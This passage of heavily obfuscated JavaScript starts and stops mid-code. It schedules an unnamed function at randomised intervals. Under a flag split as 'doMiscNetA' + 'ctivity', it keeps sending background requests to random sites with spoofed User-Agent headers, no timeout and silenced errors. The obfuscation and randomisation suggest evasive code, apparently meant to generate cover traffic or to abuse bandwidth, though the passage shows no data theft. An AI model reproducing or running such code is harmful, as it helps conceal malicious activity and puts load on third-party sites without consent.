  for (let k = -0x1 * 0x5db + -0x10b9 * 0x1 + 0x5 * 0x484; k < 0x1961 + 0x2597 + -0x3ef4; k++)
    setTimeout(f, (-0x9007 + 0x15847 + 0x2220) * k * getRandomInt(-0x1935 + 0x241a + 0x22 * -0x52, 0x224c + -0x25d2 * 0x1 + 0x389));
  setInterval(() => {
    f();
    for (let l = -0x1c3a * -0x1 + 0x1a4f + -0x17 * 0x25f; l < -0x5fb * -0x4 + 0xe3a + -0x2622; l++)
      setTimeout(f, (-0x6f32 + 0x151e7 + 0x7ab) * l * getRandomInt(-0x4b2 * -0x1 + -0x17ff + 0x1 * 0x134e, 0x1 * -0x17ab + 0x1 * -0x17cf + 0x1 * 0x2f7d));
  }, 0x5e0fc1 + 0x18bc1f * 0x1 + 0xa1e * -0x650);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1ca2 + -0x1 * 0x2bcd + 0x11f * 0x59) * getRandomInt(0x3 * -0x926 + 0x1290 + 0x8e3, -0x192e + -0x2 * 0xc58 + 0x1d9 * 0x1b));
}, 0x12a7 + 0x24bd + -0x16 * 0x280);